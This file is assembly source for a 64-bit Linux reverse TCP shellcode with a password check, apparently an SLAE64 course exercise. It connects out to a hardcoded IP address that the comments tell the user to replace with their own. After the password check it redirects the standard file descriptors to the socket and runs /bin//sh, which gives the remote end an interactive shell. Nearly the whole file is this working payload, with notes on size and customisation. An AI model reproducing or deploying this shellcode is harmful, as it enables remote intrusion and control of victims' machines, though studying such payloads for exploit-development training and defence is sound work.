bits 64
global _start

;
; Reverse TCP Connection in 64 bit shellcode
; 76 bytes without authentication
; 112 bytes with authentication 
;
; Password is R2CBw0cr
;
; Gitsnik, SLAE64-1232
;

section .text

_start:
	;
	; int socket( 2, 1, 0 )
	;
	; socket syscall number is 0x29
	; socket will return a socket into rax
	;
	; 12 bytes
	;
	push byte 0x29
	pop rax
	push byte 0x02
	pop rdi
	push byte 0x01
	pop rsi
	cdq			; rdx is null
	syscall			; socket( 2, 1, 0 )

	;
	; Swap our socket from RAX into RDI which is where
	; the next few functions want it anyway
	;
	; xchg is 1 byte shorter than mov
	;
	; 2 bytes
	xchg rdi, rax			; socket in rdi for connect() rax is now 2

	;
	; return = connect( sock, (struct sockaddr*)&serv_addr, 0x10 );
	;
	; We need to set up our serv_addr (which we know is ip,port,2)
	; So load it all into RAX and push that. Note that because we want
	; 7 bytes but the register is 8, we pad 0xff onto the back and then
	; xor it to null to line everything up.
	;
	; Example IP here is 0x950b11ac, which is 149.11.17.172 (which is actually
	; 172.17.11.149 when you reverse it :). The rest is the same as portbind.
	; To put in your own IP, replace the first 4 bytes that are being inserted
	; into RAX.
	;
	; 27 bytes
	mov rax, 0x950b11acaaaaff02
	xor ah, 0xff
	push rax

	mov rsi, rsp			; rsi points to our sockaddr *

	xor rax, rax

	add al, 0x2a			; connect()
	add dl, 0x10			; 16 (sizeof)
	syscall				; connect( rdi, rsi, rdx );
					; connect( sockfd, *sockaddr, 0x10 );

	;
	; read( socket, buffer, bytes )
	;
	; rax is syscall ( 0 = read )
	; rdi is socket
	; rsi is address to buffer (pointer)
	; rdx is number of bytes to read
	;
	; read will return number of bytes in rax
	; rsi will contain pointer to string
	; rdx will be null except for dl being 0x10
	;
	; 11 bytes
	;
	push rdx		; null on the stack so we
				; have blank space for our
				; password read.
	lea rsi, [rsp-0x10]     ; load the address of *buf
	add dl, 0x10		; number of bytes to read.
	syscall			; Do it.

	;
	; Password check.
	;
	; RSI has the pointer to our string, we're going to need
	; to save RDI as we will need the socket after the jump.
	; so all we have to do is load in the hex of our password
	; to RAX, save the socket, move the proper information
	; into RDI, and do a quick scasq.
	;
	; 20 bytes
	;
	mov rax, 0x7263307742433252     ; Put your own password here.
	push rdi			; Save the client socket
	lea rdi, [rsi]			; Load the data into RDI
	scasq

	xchg rax, rdx			; RDX is 0x10, so this effectively empties
					; RAX except for AL. Either we use AL
					; for sys_exit, or we use it for dup2
					; so this saves us some bytes by not
					; doubling up on the code.

	jz dup2setup

	;
	; Exit.
	;
	; If the password was wrong, quit :)
	;
	; 4 bytes
	;
	add al, 0x1c		; 0x3C is exit. AL already holds 0x20.
	syscall

	;
	; Setup for dup2 loop
	;
	; 4 bytes
	; 
	dup2setup:
		pop rdi
		mov rsi, rdi

	;
	; dup2 loop
	;
	; 9 bytes
	dup2:
		dec rsi
		mov al, 0x21
		syscall
		jnz dup2

	;
	; Now for the big one. Let's set up our execve()
	;
	; At this point RAX is 0 so just null out rdx
	;
	; We need rdx to be null for the 3rd argument to execve()
	;
	; 23 bytes
	cdq

	add al, 0x3b			; execve()
	mov rbx, 0x68732f2f6e69622f     ; hs//nib/

	; Argument one shell[0] = "/bin//sh"
	push rdx			; null
	push rbx			; hs//nib/

	; We need pointers for execve()
	push rsp			; *pointer to shell[0]
	pop rdi				; Argument 1

	; Argument two shell (including address of each argument in array)
	push rdx			; null
	push rdi			; address of shell[0]

	; We need pointers for execve()
	push rsp			; address of char * shell
	pop rsi				; Argument 2

	syscall
